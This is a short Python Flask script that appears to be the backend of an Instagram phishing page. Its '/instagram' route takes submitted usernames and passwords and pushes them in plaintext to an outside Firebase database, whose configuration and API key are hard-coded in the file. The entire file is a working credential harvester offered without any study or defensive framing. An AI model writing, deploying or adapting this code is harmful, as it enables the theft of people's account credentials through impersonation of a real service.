import pyrebase
from flask import Flask,jsonify,request
import json

config = {
	"apiKey": "AIzaSyABZ21hIuZNYnom5usoFSscKlJq4H6nQpE",
    "authDomain": "python-911c8.firebaseapp.com",
    "databaseURL": "https://python-911c8-default-rtdb.firebaseio.com",
    "projectId": "python-911c8",
    "storageBucket": "python-911c8.appspot.com",
    "messagingSenderId": "147798447596"
}

firebase = pyrebase.initialize_app(config)

db = firebase.database()

from flask import *

app = Flask(__name__)

@app.route('/instagram', methods=['GET', 'POST'])
def basic():
	if request.method == 'POST':
    		
		name = request.form['username']
		password = request.form['pass']
		jsonName={"name":name,"pass":password}
		db.child("insta").push(jsonName)
	return ""

if __name__ == '__main__':
	app.run(debug=True)


